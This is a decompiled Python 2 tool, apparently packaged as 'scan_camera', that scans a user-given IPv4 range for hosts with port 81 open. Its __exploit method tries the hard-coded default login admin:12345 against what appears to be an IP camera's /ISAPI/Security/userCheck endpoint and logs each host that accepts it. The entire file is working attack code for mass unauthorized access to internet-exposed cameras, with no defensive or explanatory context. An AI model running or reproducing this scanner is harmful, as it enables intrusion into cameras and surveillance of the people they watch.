# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /home/boss/Desktop/Envs/package/lib/python2.7/site-packages/scan_camera/final_scan.py
# Compiled at: 2018-10-26 23:57:46
from gevent import monkey
monkey.patch_all()
import socket
from gevent.pool import Pool
import requests, os, threading, socket, time, datetime, logging, fire, gc

class parse_ip:

    def __init__(self, start_ip, end_ip):
        self.start_ip = start_ip
        self.end_ip = end_ip
        self.base = [ str(x) for x in range(10) ] + [ chr(x) for x in range(ord('A'), ord('A') + 6) ]
        self.num = 0

    def __dec2bin80(self, string_num):
        num = int(string_num)
        mid = []
        while True:
            if num == 0:
                break
            num, rem = divmod(num, 2)
            mid.append(self.base[rem])

        result = ('').join([ str(x) for x in mid[::-1] ])
        length = len(result)
        if length < 8:
            result = '0' * (8 - length) + result
        return result

    def __dec2bin320(self, string_num):
        num = int(string_num)
        mid = []
        while True:
            if num == 0:
                break
            num, rem = divmod(num, 2)
            mid.append(self.base[rem])

        result = ('').join([ str(x) for x in mid[::-1] ])
        length = len(result)
        if length < 32:
            result = '0' * (32 - length) + result
        return result

    def __dec2bin(self, string_num):
        num = int(string_num)
        mid = []
        while True:
            if num == 0:
                break
            num, rem = divmod(num, 2)
            mid.append(self.base[rem])

        return ('').join([ str(x) for x in mid[::-1] ])

    def __bin2dec(self, string_num):
        return str(int(string_num, 2))

    def iplist(self):
        string_startip = self.start_ip
        string_endip = self.end_ip
        start = string_startip.split('.')
        start_a = self.__dec2bin80(start[0])
        start_b = self.__dec2bin80(start[1])
        start_c = self.__dec2bin80(start[2])
        start_d = self.__dec2bin80(start[3])
        start_bin = start_a + start_b + start_c + start_d
        start_dec = self.__bin2dec(start_bin)
        end = string_endip.split('.')
        end_a = self.__dec2bin80(end[0])
        end_b = self.__dec2bin80(end[1])
        end_c = self.__dec2bin80(end[2])
        end_d = self.__dec2bin80(end[3])
        end_bin = end_a + end_b + end_c + end_d
        end_dec = self.__bin2dec(end_bin)
        count = int(end_dec) - int(start_dec)
        for i in xrange(0, count + 1):
            plusone_dec = int(start_dec) + i
            plusone_dec = str(plusone_dec)
            address_bin = self.__dec2bin320(plusone_dec)
            address_a = self.__bin2dec(address_bin[0:8])
            address_b = self.__bin2dec(address_bin[8:16])
            address_c = self.__bin2dec(address_bin[16:24])
            address_d = self.__bin2dec(address_bin[24:32])
            address = address_a + '.' + address_b + '.' + address_c + '.' + address_d
            yield address


class scan_camera:

    def __init__(self, start_ip, end_ip, port=81, thread_num=20):
        self.start_ip = start_ip
        self.end_ip = end_ip
        self.port = port
        self.thread_num = thread_num
        logging.basicConfig(level=logging.CRITICAL, format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s', datefmt='%a, %d %b %Y %H:%M:%S', filename='myapp.log', filemode='a+')

    def __scan(self, ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        s.settimeout(1)
        try:
            result = s.connect_ex((ip, self.port))
            if result == 0:
                print ip, 'PORT ', self.port, ' is on'
                self.__exploit(ip)
            s.close()
        except socket.error as e:
            s.close()
            print e

        gc.collect()

    def __exploit(self, ip):
        url = 'http://' + ip + ':' + str(self.port)
        userpwd = 'Basic YWRtaW46MTIzNDU='
        headers = {'X-Requested-With': 'XMLHttpRequest', 
           'Refer': url + '/doc/page/login.asp', 
           'If-Modified-Since': '0', 
           'Authorization': userpwd}
        try:
            r = requests.get(url=url + '/ISAPI/Security/userCheck', headers=headers, timeout=5)
            if r.status_code == 200 and r.text.find('OK') != -1:
                logging.critical('%s : succeed' % ip)
                return True
            return False
        except Exception as e:
            return False

        gc.collect()

    def run(self):
        starttime = datetime.datetime.now()
        pool = Pool(int(self.thread_num))
        ip = parse_ip(self.start_ip, self.end_ip)
        pool.map(self.__scan, ip.iplist())
        pool.join()
        endtime = datetime.datetime.now()
        logging.critical('total_time: %s' % (endtime - starttime).seconds)
        logging.critical('total_num: %s' % ip.num)


def execute():
    gc.enable()
    fire.Fire(scan_camera)
    gc.collect()


if __name__ == '__main__':
    execute()